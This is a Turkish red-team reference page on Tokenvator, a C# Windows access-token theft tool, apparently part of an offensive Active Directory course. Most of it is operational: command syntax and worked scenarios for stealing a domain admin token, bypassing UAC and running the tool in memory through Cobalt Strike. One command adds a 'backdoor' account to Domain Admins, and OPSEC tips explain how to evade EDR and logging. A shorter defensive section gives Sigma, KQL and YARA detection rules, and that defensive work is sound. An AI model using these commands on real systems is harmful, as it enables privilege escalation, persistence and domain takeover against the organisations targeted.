# Tokenvator

> **Kategori:** [9. ACL, GPO VE NESNE MANİPÜLASYONU (OBJECT, ACL & DELEGATION ABUSE)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Alexander Leary (@0xbadjuju) tarafından geliştirilen; Windows işletim sisteminde C# (.NET) ile yazılmış, Cobalt Strike / Sliver C2 çerçevelerinde bellek içi (`execute-assembly`) çalıştırılabilen, süreç ve iş parçacığı belirteçlerini (Access Tokens) ayrıntılı listeleyen, ayrıcalıkları etkinleştiren (`SeDebugPrivilege` vb.), token kopyalayan (`DuplicateTokenEx`) ve çalınan belirteçle yeni süreç başlatan gelişmiş belirteç manipülasyon aracı.

---

## 1. Genel Bakış ve Amaç

Windows işletim sistemlerinde Erişim Belirteçleri (Access Tokens), bir sürecin veya iş parçacığının kimlik, grup üyeliği ve ayrıcalık sınırlarını belirleyen en kritik güvenlik nesnesidir. Klasik `Incognito` aracı bu mimariyi istismar eden ilk araçlardan biri olsa da, unmanaged C/C++ ile yazılmış olması ve modern Antivirüs / EDR yazılımları tarafından statik imza ile anında tanınması operasyonel kullanımını sınırlandırmıştır.

**`Tokenvator`**, Incognito'nun sunduğu tüm belirteç hırsızlığı yeteneklerini modern kırmızı takım operasyonları için sıfırdan C# (.NET) mimarisiyle yeniden inşa eden, nesne yönelimli ve C2 dostu bir araçtır.

Standart Windows API'lerini (`advapi32.dll`, `kernel32.dll`) Win32 P/Invoke ile çağırarak:
- Sistemdeki tüm süreç ve iş parçacıklarının belirteçlerini, kullanıcı adlarını, SID değerlerini, bütünlük düzeylerini (Integrity Level) ve ayrıcalık durumlarını ayrıntılı şekilde numaralandırır.
- İşletim sisteminde tanımlı ancak pasif durumdaki ayrıcalıkları (`SeDebugPrivilege`, `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`) dinamik olarak etkinleştirir (`AdjustTokenPrivileges`).
- Hedef süreçten belirteci kopyalar (`DuplicateTokenEx`) ve birincil belirtece dönüştürür.
- İster yeni bir komut istemi başlatır (`CreateProcessWithTokenW`), isterse yeni bir süreç başlatmadan mevcut C2 iş parçacığını doğrudan hedef kullanıcının kimliğine büründürür (`ImpersonateLoggedOnUser`).

### Belirteç Numaralandırma ve Yükseltme Mimarisi

Tokenvator, Windows belirteç yapısını derinlemesine analiz eder:
- **Elevation Type (Yükseltme Türü):** `TokenElevationTypeDefault` (Standart/UAC kapalı), `TokenElevationTypeFull` (Yükseltilmiş Yönetici), `TokenElevationTypeLimited` (Kısıtlı UAC belirteci).
- **Impersonation Level (Taklit Düzeyi):** `SecurityAnonymous`, `SecurityIdentification`, `SecurityImpersonation`, `SecurityDelegation`.
- **Restricted Tokens (Kısıtlı Belirteçler):** Gerekirse bir belirteçteki yetkileri budayarak (Restricted Token) düşük bütünlük seviyesinde testler yapabilir veya sanal alan (sandbox) kısıtlamalarını simüle edebilir.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│                   HEDEF WINDOWS UÇ NOKTA (C2 BEACON / C# IN-MEMORY)   │
│                                                                        │
│  [ execute-assembly Tokenvator.exe Steal /Process:1420 /Command:cmd ]  │
│         │                                                              │
│         ├── (1) Current Token Ayrıcalığı Açılır:                       │
│         │       OpenProcessToken() -> AdjustTokenPrivileges()          │
│         │       └── SeDebugPrivilege = SE_PRIVILEGE_ENABLED            │
│         │                                                              │
│         ├── (2) Hedef Sürece (PID 1420 - da_admin) Handle Açılır:      │
│         │       OpenProcess(PROCESS_QUERY_INFORMATION)                 │
│         │                                                              │
│         ├── (3) Süreç Belirteci Alınır ve Kopyalanır:                  │
│         │       OpenProcessToken(TOKEN_DUPLICATE | TOKEN_QUERY)        │
│         │       DuplicateTokenEx(..., TokenPrimary, ...)               │
│         │                                                              │
│         ├── (4) Yeni Süreç Başlatılır veya İş Parçacığına Giydirilir:  │
│         │       CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE)    │
│         │       VEYA ImpersonateLoggedOnUser(hToken)                   │
│         │                                                              │
│         ▼                                                              │
│  [ ÇIKTI: Yeni Süreç CORP\da_admin Yetkileriyle Çalıştırıldı! ]        │
└────────────────────────────────────────────────────────────────────────┘
```

### Neden Önemli? Operasyonel Değer

| Operasyonel Kriter | Klasik Incognito | Tokenvator (C# .NET) |
|---|---|---|
| **C2 Entegrasyonu** | Unmanaged PE; DLL injection veya diske yazma gerekir. | Saf C# .NET montajı; Cobalt Strike'ta `execute-assembly` ile bellekte çalışır. |
| **Ayrıcalık Yönetimi** | Ayrıcalıkları otomatik açamaz; kullanıcıdan hazır yetki bekler. | `EnablePrivilege` ile `SeDebugPrivilege` vb. hakları dinamik olarak açar. |
| **İş Parçacığı Desteği**| Yalnızca süreç seviyesinde belirteç okur. | Hem süreç (Process) hem de iş parçacığı (Thread) belirteçlerini ayrı ayrı inceler. |
| **UAC Bypass Desteği** | UAC atlatma yeteneği yoktur. | Kısıtlı olmayan belirteçleri kopyalayarak yerel UAC atlatma yeteneğine sahiptir. |

### Alternatif Araçlarla Karşılaştırma

| Özellik | Tokenvator | Incognito | Mimikatz (token) | Cobalt Strike |
|---|---|---|---|---|
| **Geliştirme Dili** | C# (.NET) | C/C++ (Native) | C Native | C Beacon |
| **Ayrıcalık Açma** | 🟢 Yerleşik (`EnablePrivilege`)| 🔴 Yok | 🟢 `privilege::debug` | 🟢 Yerleşik |
| **Thread Token Analizi**| 🟢 Var (`GetThreadTokens`) | 🔴 Yok | 🟡 Kısıtlı | 🔴 Yok |
| **EDR Bellek Tespiti** | 🟢 Düşük (Özel derleme) | 🔴 Yüksek (Bilinen imza) | 🔴 Çok Yüksek | 🟢 Düşük |
| **Süreçsiz Taklit** | 🟢 `ImpersonateUser` | 🟡 `impersonate_token` | 🟢 `token::elevate` | 🟢 `steal_token` |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

Tokenvator, yürütülmek istenen işleme göre alt komutlar ve bunlara bağlı parametre anahtarlarıyla çalışır.

### Genel Sözdizimi

```cmd
Tokenvator.exe <Komut> [/Parametre:Değer]
```

### Desteklenen Kritik Komutlar ve Parametreler

| Komut / Parametre | Açıklama | Örnek Kullanım |
|---|---|---|
| `GetProcessTokens` | Sistemde çalışan tüm süreçlerin belirteçlerini ve kullanıcı kimliklerini listeler. | `Tokenvator.exe GetProcessTokens` |
| `GetThreadTokens` | Belirtilen süreç içindeki iş parçacıklarına atanmış taklit belirteçlerini listeler. | `Tokenvator.exe GetThreadTokens /Process:844` |
| `ListPrivileges` | Geçerli sürecin belirtecinde tanımlı tüm ayrıcalıkları ve durumlarını (Enabled/Disabled) döker. | `Tokenvator.exe ListPrivileges` |
| `EnablePrivilege /Privilege:<Ad>` | Belirtilen ayrıcalığı geçerli süreç belirtecinde etkinleştirir. | `Tokenvator.exe EnablePrivilege /Privilege:SeDebugPrivilege` |
| `Steal /Process:<PID> /Command:<Yol>` | Belirtilen PID'deki sürecin belirtecini çalarak yeni bir komut çalıştırır. | `Tokenvator.exe Steal /Process:1420 /Command:cmd.exe` |
| `Impersonate /Process:<PID>` | Yeni bir süreç başlatmadan mevcut C2 iş parçacığını belirtilen PID'nin kullanıcısına büründürür. | `Tokenvator.exe Impersonate /Process:1420` |
| `BypassUAC /Process:<PID> /Command:<Yol>` | Yükseltilmiş bir sürecin belirtecini kopyalayarak UAC onay penceresi çıkmadan komut çalıştırır. | `Tokenvator.exe BypassUAC /Process:844 /Command:cmd.exe` |
| `RevertToSelf` | Taklit edilen belirteci serbest bırakır ve oturumun orijinal kimliğine geri döner. | `Tokenvator.exe RevertToSelf` |
| `WhoAmI` | Mevcut iş parçacığının o an hangi belirteç ve kullanıcı kimliği altında çalıştığını doğrular. | `Tokenvator.exe WhoAmI` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Sistemdeki Süreç Belirteçlerinin ve Yükseltme Durumlarının Taranması

Yerel yönetici yetkisi elde edilmiş bir sunucuda hangi süreçlerin Domain Admin veya ayrıcalıklı token taşıdığını tespit etmek:

```cmd
Tokenvator.exe GetProcessTokens
```

**Örnek Konsol Çıktısı Analizi:**

```text
C:\Tools> Tokenvator.exe GetProcessTokens

  _______    _                                 
 |__   __|  | |                                
    | | ___ | | _____ _ ____   ____ _| |_ ___  _ __ 
    | |/ _ \| |/ / _ \ '_ \ \ / / _` | __/ _ \| '__|
    | | (_) |   <  __/ | | \ V / (_| | || (_) | |   
    |_|\___/|_|\_\___|_| |_|\_/ \__,_|\__\___/|_|   
  v1.0 - Access Token Manipulation Utility

[+] Enumerating process tokens...

PID    Process Name         User Context           Elevation Type    Integrity Level
====================================================================================
4      System               NT AUTHORITY\SYSTEM    Default           System
844    winlogon.exe         NT AUTHORITY\SYSTEM    Full              System
1290   explorer.exe         CORP\jdoe              Limited           Medium
1420   taskhostw.exe        CORP\da_admin          Full              High       <--- HEDEF
2840   spoolsv.exe          NT AUTHORITY\SYSTEM    Full              System
3104   powershell.exe       CORP\svc_backup        Full              High
```

*Çıktı Yorumu:* PID 1420 (`taskhostw.exe`) sürecinin `CORP\da_admin` kimliğiyle çalıştığı, `Elevation Type: Full` (Tam yetkili) ve `High Integrity` seviyesinde olduğu tespit edilmiştir.

### Senaryo 2: Hedef Süreçten Belirteç Çalarak Komut İstemi Başlatma

Tespit edilen PID 1420 sürecinin belirtecini çalarak yeni bir `cmd.exe` başlatılması:

```cmd
Tokenvator.exe Steal /Process:1420 /Command:cmd.exe
```

**Örnek Konsol Çıktısı:**

```text
[*] Target Process ID: 1420
[*] Opening process handle with PROCESS_QUERY_INFORMATION...
[+] Process handle acquired: 0x0000018C
[*] Opening process token with TOKEN_DUPLICATE | TOKEN_QUERY...
[+] Token handle acquired: 0x00000194
[*] Duplicating token with DuplicateTokenEx (SecurityImpersonation -> TokenPrimary)...
[+] Primary token successfully duplicated!
[*] Launching process 'cmd.exe' with CreateProcessWithTokenW...
[+] Process created successfully! PID: 3984
```

Başlatılan komut isteminde etki alanı denetleyicisine (`\\dc01\c$`) tam etki alanı yöneticisi yetkileriyle erişilebilir.

### Senaryo 3: Ayrıcalıkları Dinamik Olarak Etkinleştirme (SeDebugPrivilege)

Mevcut süreç belirtecinde pasif durumda bekleyen `SeDebugPrivilege` yetkisini aktif hale getirerek diğer süreçlerin belleğini okuyabilir konuma gelmek:

```cmd
Tokenvator.exe EnablePrivilege /Privilege:SeDebugPrivilege
```

**Örnek Konsol Çıktısı:**

```text
[*] Attempting to enable privilege 'SeDebugPrivilege'...
[+] Successfully adjusted token privileges!
[+] 'SeDebugPrivilege' is now ENABLED on current process token.
```

### Senaryo 4: Yeni Süreç Başlatmadan İş Parçacığı Seviyesinde Belirteç Taklidi (OPSEC Dostu)

`CreateProcessWithTokenW` çağrısı yaparak yeni bir süreç oluşturmak yerine, mevcut C2 iş parçacığının kimliğini doğrudan hedef kullanıcıya büründürmek:

```cmd
Tokenvator.exe Impersonate /Process:1420
```

Bu komuttan sonra `Tokenvator.exe WhoAmI` çalıştırıldığında iş parçacığının kimliği `CORP\da_admin` olarak görünür. Arka planda yeni bir `.exe` süreci spawn edilmediği için EDR süreç izleme radarı atlatılır.

### Senaryo 5: Kısıtlı Belirteçten Yükseltilmiş Belirtece Geçiş (UAC Bypass)

Kullanıcının çift belirtece (Linked Token) sahip olduğu durumlarda kısıtlı oturumdan yükseltilmiş oturuma geçiş:

```cmd
Tokenvator.exe BypassUAC /Process:844 /Command:"C:\Windows\System32\cmd.exe"
```

### Senaryo 6: Cobalt Strike / Sliver Bellek İçi Yürütme

Diske hiçbir dosya yazmadan C2 Beacon oturumu üzerinden `execute-assembly` ile doğrudan bellekten yürütme:

```text
beacon> execute-assembly /opt/tools/Tokenvator.exe Steal /Process:1420 /Command:"cmd.exe /c net group \"Domain Admins\" backdoor /add /domain"
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Kod | Temel Neden | Kesin Çözüm Adımı |
|---|---|---|
| `AdjustTokenPrivileges failed: Error 1300 (Not all privileges referenced are assigned)` | Etkinleştirilmek istenen ayrıcalık (Örn: `SeDebugPrivilege`) belirtecin güvenlik tanımlayıcısında hiç tanımlı değildir (Orta/Düşük bütünlükte çalışılmaktadır). | Komut istemi en az Yüksek Bütünlük (High Integrity / Run as Administrator) veya SYSTEM seviyesine yükseltilmelidir; standart kullanıcı belirtecine sonradan admin ayrıcalığı eklenemez. |
| `OpenProcessToken failed: Error 5 (Access Denied)` | Hedef süreç `Protected Process Light (PPL)` (Örn: `lsass.exe`) ile korunmaktadır veya hedef sürecin DACL'i belirteç okumayı engellemektedir. | Korunan sistem süreçleri yerine normal kullanıcı süreçleri (`taskhostw.exe`, `explorer.exe`, `notepad.exe`) hedeflenmelidir. |
| `CreateProcessWithTokenW failed: Error 1314` | Windows İkincil Oturum Açma (`Secondary Logon - seclogon`) servisi durdurulmuştur veya devre dışıdır. | Servis başlatılmalıdır (`net start seclogon`) veya süreç açmak yerine iş parçacığı taklidi (`Impersonate /Process:<PID>`) kullanılmalıdır. |
| `DuplicateTokenEx failed: Error 1346 (Bad impersonation level)` | Kopyalanmak istenen belirteç yalnızca `SecurityIdentification` seviyesindedir; taklit (`SecurityImpersonation`) seviyesine yükseltilemez. | Farklı bir süreçteki tam yetkili belirteç hedeflenmeli veya `Impersonation Level` destekleyen bir oturum seçilmelidir. |
| `Kerberos network authentication failed with stolen token` | Çalınan belirteç yerel bir taklit belirtecidir (`Impersonation Token`); uzak ağda yetki devretme hakkı (`Delegation Token`) bulunmamaktadır (İki atlama sorunu). | Makinede RBCD yapılandırılmalı veya belirteç üzerinden ağa erişmek yerine `runas /netonly` ya da bilet enjeksiyonu ([Rubeus](../Kategori_06_Kerberos_Protokol_Cephaneligi/Rubeus.md)) kullanılmalıdır. |
| `Process not found by ID / Invalid PID` | Hedef sürecin PID'si değişmiştir, süreç sonlanmış veya kullanıcı oturumu kapatmıştır. | `Tokenvator.exe GetProcessTokens` komutu tekrar çalıştırılarak güncel PID numarası doğrulanmalıdır. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
┌────────────────────────────────────────────────────────────────────────┐
│                        GÜRÜLTÜ VE İZ SEVİYESİ                          │
│                                                                        │
│  [ Bellek İzi ]      : 🟢 DÜŞÜK (C# execute-assembly ile in-memory)    │
│  [ LSASS Müdahalesi ]: 🟢 SIFIR (lsass.exe sürecine dokunulmaz)        │
│  [ Süreç Taklit İzi ]: 🟡 ORTA (ImpersonateLoggedOnUser daha gizlidir) │
│  [ Olay Günlükleri ] : 🔴 YÜKSEK (Event 4672 Ayrıcalık Etkinleştirme)  │
└────────────────────────────────────────────────────────────────────────┘
```

### 5.1 Bırakılan İzler (Artifacts & Telemetry)

1. **Windows Güvenlik Günlükleri (Security Log):**
   - **Event ID 4672 (Special privileges assigned to new logon):** `SeDebugPrivilege` veya `SeTcbPrivilege` gibi kritik ayrıcalıklar etkinleştirildiğinde üretilir.
   - **Event ID 4673 (Privileged Service Called):** Ayrıcalık kontrolü başarısız olduğunda veya şüpheli API çağrısı yapıldığında kaydedilir.
   - **Event ID 4624 (Logon Event - LogonType 9):** `CreateProcessWithTokenW` çağrısı yeni bir oturum tipi oluşturabilir.
2. **Sysmon Günlükleri:**
   - **Event ID 10 (ProcessAccess):** Bir sürecin hedef sürece `PROCESS_QUERY_INFORMATION` (0x0400) ve `PROCESS_VM_READ` haklarıyla erişim açması.
   - **Event ID 1 (Process Create):** Ana süreç (`ParentProcess`) ile yeni başlatılan sürecin kullanıcı kimliğinin (`User`) farklı olması (Belirteç Hırsızlığı Göstergesi).

### 5.2 Ağ ve EDR İmzaları

- **EDR Davranışsal Tespiti:** Bir sürecin önce `SeDebugPrivilege` yetkisini açıp hemen ardından başka bir kullanıcının belirtecini `DuplicateTokenEx` ile kopyalayarak komut çalıştırması EDR davranışsal kurallarında doğrudan "Access Token Manipulation" (T1134) kuralını tetikler.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araç İçindeki Kullanım |
|---|---|---|
| **T1134.001** | Access Token Manipulation: Token Impersonation/Theft | Başka bir kullanıcının belirtecinin kopyalanıp taklit edilmesi. |
| **T1134.002** | Access Token Manipulation: Create Process with Token | Kopyalanan belirteç ile yeni yetkili süreç başlatılması. |
| **T1134.004** | Access Token Manipulation: Parent PID Spoofing | Belirteç manipülasyonu ile süreç hiyerarşisinin gizlenmesi. |
| **T1057** | Process Discovery | Sistemdeki süreçlerin ve belirteç sahiplerinin taranması. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Pratiği |
|---|---|
| **Yeni Süreç Spawn Etme Riski** | `Steal /Command:cmd.exe` yeni bir süreç başlatır ve EDR'a yakalanabilir. Bunun yerine yeni süreç açmayan `Impersonate /Process:<PID>` komutunu kullanarak mevcut iş parçacığının kimliğini değiştirin. |
| **`GetProcessTokens` Gürültüsü** | Tüm süreçleri tek tek sorgulamak onlarca Event 10 üretir. Hedef kullanıcının PID'sini önceden sessizce tespit edin (Örn: `tasklist /v`) ve doğrudan o PID'yi hedefleyin. |
| **Kalıcı Taklit İzi** | Belirteçle yapılacak operasyonel işlem tamamlandığı anda mutlaka `RevertToSelf` çalıştırarak orijinal kullanıcı kimliğinize geri dönün. |
| **Diske Dosya Bırakma** | `Tokenvator.exe` dosyasını diske kaydetmeyin; Cobalt Strike veya Sliver üzerinden `execute-assembly` ile doğrudan bellekten çalıştırın. |

### 5.5 Savunma Karşılığı: Tespit Kuralları

#### Sigma Kuralı: Şüpheli Tokenvator CLI Argümanları ve Belirteç Hırsızlığı Tespiti

```yaml
title: Tokenvator Access Token Manipulation Execution
id: e81248a1-3812-4c20-a912-38910245fe01
status: experimental
description: Detects command-line arguments indicative of Tokenvator token theft and manipulation tool.
author: Modul 11 Security Research
logsource:
  category: process_creation
  product: windows
detection:
  selection_cli:
    CommandLine|contains:
      - 'Tokenvator'
      - 'GetProcessTokens'
      - 'EnablePrivilege /Privilege:'
      - 'Steal /Process:'
      - 'Impersonate /Process:'
      - 'BypassUAC /Process:'
  condition: selection_cli
falsepositives:
  - Rare custom internal administrative tools designed with similar syntax
level: critical
tags:
  - attack.privilege_escalation
  - attack.t1134.001
```

#### Microsoft Sentinel KQL Sorgusu: SeDebugPrivilege Etkinleştirme ve Ardından Süreç Başlatma

```kql
// Kısa sürede SeDebugPrivilege etkinleştirilip ardından farklı kullanıcı kimliğiyle süreç başlatılması
let PrivAdjust = SecurityEvent
| where TimeGenerated > ago(1h)
| where EventID == 4672 and PrivilegeList has "SeDebugPrivilege"
| project PrivTime = TimeGenerated, SubjectUserName, Computer;
let ProcessStarts = SecurityEvent
| where TimeGenerated > ago(1h)
| where EventID == 4688
| project ProcTime = TimeGenerated, SubjectUserName, TargetUserName, NewProcess = Process, CommandLine;
PrivAdjust
| join kind=inner (ProcessStarts) on SubjectUserName
| where ProcTime between (PrivTime .. (PrivTime + 3m))
| project PrivTime, ProcTime, Computer, SubjectUserName, TargetUserName, NewProcess, CommandLine
```

#### YARA Kuralı: Tokenvator Derlenmiş .NET Binary ve String Tespiti

```yara
rule PostExploit_Tokenvator_Assembly {
    meta:
        description = "Detects compiled Tokenvator .NET assembly and token manipulation methods"
        author = "Active Directory Red Team Module 11"
        date = "2026-10-14"
        severity = "Critical"
    strings:
        $s1 = "Tokenvator" ascii wide
        $s2 = "GetProcessTokens" ascii wide
        $s3 = "DuplicateTokenEx" ascii
        $s4 = "AdjustTokenPrivileges" ascii
        $s5 = "CreateProcessWithTokenW" ascii
        $s6 = "0xbadjuju" ascii wide
    condition:
        uint16(0) == 0x5A4D and (
            3 of ($s1, $s2, $s3, $s4, $s5, $s6)
        )
}
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Süreç Belirteçlerini Listeleme
```cmd
Tokenvator.exe GetProcessTokens
```
- **Ne Yapar?** Sistemdeki tüm süreçlerin belirteçlerini, sahiplerini, bütünlük seviyelerini ve yükseltme durumlarını listeler.
- **Ne Zaman Kullanılır?** Makinede hangi süreçlerin Domain Admin veya SYSTEM belirteci taşıdığını tespit etmek için.
- **Parametreler:** Parametre almaz.

### Komut 2: Hedef Süreçten Belirteç Çalarak Yeni Komut Başlatma
```cmd
Tokenvator.exe Steal /Process:1420 /Command:cmd.exe
```
- **Ne Yapar?** Belirtilen PID'deki sürecin belirtecini kopyalar ve o kimlikle yeni bir `cmd.exe` başlatır.
- **Ne Zaman Kullanılır?** Domain Admin belirteci yakalandığında yetkili komut kabuğu açmak için.
- **Parametreler:** `/Process`: Hedef sürecin PID'si, `/Command`: Çalıştırılacak program.

### Komut 3: SeDebugPrivilege Ayrıcalığını Etkinleştirme
```cmd
Tokenvator.exe EnablePrivilege /Privilege:SeDebugPrivilege
```
- **Ne Yapar?** Geçerli sürecin belirtecindeki `SeDebugPrivilege` hakkını aktif duruma getirir.
- **Ne Zaman Kullanılır?** Diğer sistem süreçlerinin belleğine erişmeden önce ön yetkilendirme sağlamak için.
- **Parametreler:** `/Privilege`: Etkinleştirilecek ayrıcalık adı.

### Komut 4: İş Parçacığı Seviyesinde Belirteç Taklidi (Süreç Açmadan)
```cmd
Tokenvator.exe Impersonate /Process:1420
```
- **Ne Yapar?** Yeni bir süreç açmadan geçerli C2 iş parçacığını hedef kullanıcının kimliğine büründürür.
- **Ne Zaman Kullanılır?** EDR süreç izleme mekanizmalarını atlatarak sessizce yetki yükseltmek için.
- **Parametreler:** `/Process`: Belirteci çalınacak sürecin PID'si.

### Komut 5: Orijinal Kimliğe Geri Dönme (RevertToSelf)
```cmd
Tokenvator.exe RevertToSelf
```
- **Ne Yapar?** Taklit edilen belirteci bırakarak oturumun orijinal kimliğine geri döner.
- **Ne Zaman Kullanılır?** Ayrıcalıklı işlem tamamlandığında iz bırakmamak için.
- **Parametreler:** Parametre almaz.

### Komut 6: Mevcut Kimliği Doğrulama (WhoAmI)
```cmd
Tokenvator.exe WhoAmI
```
- **Ne Yapar?** O an geçerli iş parçacığının hangi kullanıcı belirteci altında çalıştığını doğrular.
- **Ne Zaman Kullanılır?** Belirteç taklidinin başarılı olup olmadığını kontrol etmek için.
- **Parametreler:** Parametre almaz.

### Komut 7: Belirli Bir Sürecin İş Parçacığı Belirteçlerini İnceleme
```cmd
Tokenvator.exe GetThreadTokens /Process:844
```
- **Ne Yapar?** Belirtilen süreç içindeki iş parçacıklarına atanmış taklit belirteçlerini döker.
- **Ne Zaman Kullanılır?** Süreç seviyesinde görünmeyen gizli taklit belirteçlerini yakalamak için.
- **Parametreler:** `/Process`: Hedef PID.

### Komut 8: Belirteç Kopyalayarak UAC Korumasını Atlama (BypassUAC)
```cmd
Tokenvator.exe BypassUAC /Process:844 /Command:"cmd.exe /c whoami > C:\uac.txt"
```
- **Ne Yapar?** Yükseltilmiş bir sistem sürecinin belirtecini kopyalayarak UAC penceresi çıkmadan komut çalıştırır.
- **Ne Zaman Kullanılır?** Yerel yönetici oturumunda kısıtlı UAC belirtecinden kurtulmak için.
- **Parametreler:** `/Process`: Yükseltilmiş PID, `/Command`: Çalıştırılacak komut.

### Komut 9: Belirteç Ayrıcalıklarını Listeleme
```cmd
Tokenvator.exe ListPrivileges
```
- **Ne Yapar?** Mevcut sürecin belirtecinde hangi ayrıcalıkların tanımlı olduğunu ve durumlarını gösterir.
- **Ne Zaman Kullanılır?** Hangi ayrıcalıkların (`SeImpersonate`, `SeBackup` vb.) açılabileceğini görmek için.
- **Parametreler:** Parametre almaz.

### Komut 10: Çalınan Belirteç ile Arka Planda Ağ Paylaşımına Erişme
```cmd
Tokenvator.exe Steal /Process:1420 /Command:"cmd.exe /c copy \\dc01\sysvol\corp.local\Policies\gpt.ini C:\gpt.ini"
```
- **Ne Yapar?** Domain Admin belirteciyle sessizce uzak DC'den dosya kopyalar.
- **Ne Zaman Kullanılır?** Görünür komut kabuğu açmadan hedefli veri veya dosya çekmek için.
- **Parametreler:** Tek satırlık komut satırı argümanı.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [0xbadjuju / Tokenvator](https://github.com/0xbadjuju/Tokenvator)
- **Alexander Leary Araştırması:** [Access Token Manipulation in C#](https://0xbadjuju.github.io/)
- **Microsoft Win32 API Dokümantasyonu:** [DuplicateTokenEx Function](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex)
- **MITRE ATT&CK Referansı:** [T1134.001 - Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001/)

---

> **Önceki:** [← Incognito](./Incognito.md) · **Sonraki:** [Snaffler (Kategori 10) →](../Kategori_10_Kurumsal_Altyapi_Paylasim_ve_Veri_Avi/Snaffler.md)
